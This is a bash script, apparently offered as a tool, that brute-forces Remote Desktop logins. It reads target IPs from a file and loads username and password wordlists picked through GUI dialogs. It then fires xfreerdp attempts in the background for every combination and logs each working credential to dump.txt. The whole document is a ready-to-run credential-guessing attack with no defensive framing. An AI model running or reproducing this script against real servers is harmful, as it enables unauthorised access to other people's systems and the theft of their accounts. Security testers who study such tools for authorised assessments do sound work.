#!/bin/bash

echo "$(<./ascii.txt )"

echo "--[ TOOL ]--[ RDP BRUTEFORCE ]--[ SUJAL TULADHAR ]"

# Initialize variables
usernames_file=""
passwords_file=""
rdp_server=""

# Read activeRDPs.txt into an array
mapfile -t activeRDPs < "./activeRDPs.txt"

# Function to check if a file is empty or does not exist
check_file_content() {

    # Assigns the first parameter (file path) to the local variable 'file_path'.
    local file_path="$1" 

    # Assigns the second parameter (error message) to the local variable 'error_message'.
    local error_message="$2"  

    # Checks if the file is empty or does not exist.
    if [ ! -s "$file_path" ] || ! grep -q '[^[:space:]]' "$file_path"; then
        echo "Debug: $file_path is empty or does not exist."
        zenity --info --text="$error_message"
        exit 1
    else
        echo "Debug: $file_path exists and is not empty."
    fi
}

# Function to write to dump.txt
write_to_dump() {

    # Assigns the first parameter (message) to the local variable 'message'.
    local message="$1"

    # Checks if the dump.txt file exists.
    if [ ! -f "dump.txt" ]; then
        echo "$message" > "dump.txt"
    else
        echo "$message" >> "dump.txt"
    fi
}

# Function to attempt an RDP connection and display results
attempt_rdp_connection() {
    local username="$1"
    local password="$2"
    local rdp_server="$3"
    
    # Attempts an RDP connection using xfreerdp with the provided username, password, and RDP server IP address.
    if xfreerdp /u:"$username" /p:"$password" /v:"$rdp_server" &> /dev/null; then

    # If the RDP connection attempt is successful then Get current timestamp
        timestamp=$(date +"%Y-%m-%d %H:%M:%S")
        message="[$timestamp] Status: Successful - RDP connection with Username: $username, Password: $password, IP: $rdp_server"
        echo -e "\e[92m$message\e[0m"
        write_to_dump "$message"

    else
        # Failure message in red
        message="Status: Failed - RDP connection with Username: $username, Password: $password, IP: $rdp_server"
        echo -e "\e[91m$message\e[0m"
    fi
}

# GUI prompts for user inputs with repeated validation until the correct file type is chosen
get_valid_file() {
    local file_type_prompt=$1
    local title=$2
    local text=$3
    local file

    # Loop until a valid file is selected.
    while true; do

         # Prompts the user to select a file using Zenity.
        file=$(zenity --file-selection --title="$title" --text="$text")

        # Checks if the user cancelled the file selection.
        if [[ -z "$file" ]]; then
            zenity --info --text="File selection cancelled. Exiting script."
            exit 1
        fi

        # Validates the file type (must end with .txt or .csv).
        if [[ "$file" =~ \.txt$|\.csv$ ]]; then
            break
        else
            zenity --error --text="Invalid file format. Please select a .txt or .csv file."
        fi
    done
    echo "$file"
}

# Check if the activeRDPs.txt file contains content, otherwise exit with an error message.
check_file_content "./activeRDPs.txt" "No Active RDP IPs were stored."

# Prompt the user to select a usernames file using a GUI, ensuring it's either a .txt or .csv file.
usernames_file=$(get_valid_file "usernames" "Select the username file" "Select the usernames.txt or .csv file:")

# Prompt the user to select a passwords file using a GUI, ensuring it's either a .txt or .csv file.
passwords_file=$(get_valid_file "passwords" "Select the password file" "Select the passwords.txt or .csv file:")

# Read usernames and passwords into arrays
passwords=($(cat "$passwords_file"))

# Iterate over each line in the activeRDPs.txt file
for ip in "${activeRDPs[@]}"; do
    # Skip empty lines
    [ -z "$ip" ] && continue

    # Iterate over each line in the usernames file
    while IFS= read -r line; do
        # Skip empty lines
        [ -z "$line" ] && continue

        # Use line breaks as the delimiter to split the line into an array of usernames
        IFS=$'\n' read -a usernames <<< "$line"

        # Iterate over each username
        for username in "${usernames[@]}"; do

            # Iterate over each password in the passwords array.
            for password in "${passwords[@]}"; do

                # Attempt an RDP connection with the current username, password, and IP address in the background.
                attempt_rdp_connection "$username" "$password" "$ip" &  # Run in the background
                sleep 1  
            done
        done
    done < "$usernames_file"
done


# Inform the user that the script has completed
echo "RDP connection attempts completed."

sleep 5
